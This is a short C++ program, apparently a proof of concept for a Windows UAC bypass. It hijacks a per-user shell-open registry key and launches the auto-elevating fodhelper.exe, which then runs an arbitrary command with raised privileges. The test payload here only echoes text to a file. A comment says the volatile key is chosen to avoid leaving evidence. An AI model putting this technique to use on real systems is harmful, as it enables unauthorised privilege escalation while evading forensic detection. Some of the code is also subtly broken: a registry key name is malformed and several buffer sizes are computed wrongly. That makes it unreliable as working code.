#include <iostream>
#include <Windows.h>

#pragma warning(disable:4996)

int main() {

	// we need this to capture the possible errors (these functions will only return error, so we cannot use GetLastError)
	int result;

	HKEY softwareKey = 0;
	result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_ALL_ACCESS, &softwareKey);
	if (result != ERROR_SUCCESS) {
		std::cout << "[!] Error: " << result;
		return 1;
	}

	HKEY commandKey = 0;
	DWORD registryStatus = 0;
	// we will use VOLATILE HIVE - no need to leave evidence on the system
	result = RegCreateKeyExA(softwareKey, "Classes\\mssettings\\shell\\open\\command", 0, NULL, REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, &commandKey, &registryStatus);
	if (result != ERROR_SUCCESS) {
		std::cout << "[!] Error: " << result;
		return 1;
	}

	if (registryStatus == REG_CREATED_NEW_KEY) {
		std::cout << "[+] Registry created" << std::endl;
	}
	else if (registryStatus == REG_OPENED_EXISTING_KEY) {
		std::cout << "[+] Registry already existed" << std::endl;
	}

	std::cout << "[+] Setting (Default) value to \"cmd /c echo \"da\" > C:\\temp.txt\"" << std::endl;
	
	std::string commandRaw("cmd /c echo \"da\" > C:\\temp.txt");

	// we will use NULL (second param) to update the (Default) value
	result = RegSetValueExA(commandKey, NULL, 0, REG_SZ, (LPBYTE)commandRaw.c_str(), sizeof(commandRaw) + 1);
	
	if (result != ERROR_SUCCESS) {
		std::cout << "[!] Error: " << result;
		return 1;
	}

	// set DelegateExecute
	std::cout << "[+] Setting DelegateExecute value" << std::endl;

	std::string empty("");

	result = RegSetValueExA(commandKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)empty.c_str(), sizeof(empty) + 1);

	if (result != ERROR_SUCCESS) {
		std::cout << "[!] Error: " << result;
		return 1;
	}


	// Create FodHelper process
	LPSTARTUPINFOA       si;
	PPROCESS_INFORMATION pi;
	BOOL                 success;

	si = new STARTUPINFOA();
	si->cb = sizeof(LPSTARTUPINFO);

	pi = new PROCESS_INFORMATION();

	char cmd[] = "fodhelper.exe";

	success = CreateProcessA(
		NULL,
		cmd,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		si,
		pi);
}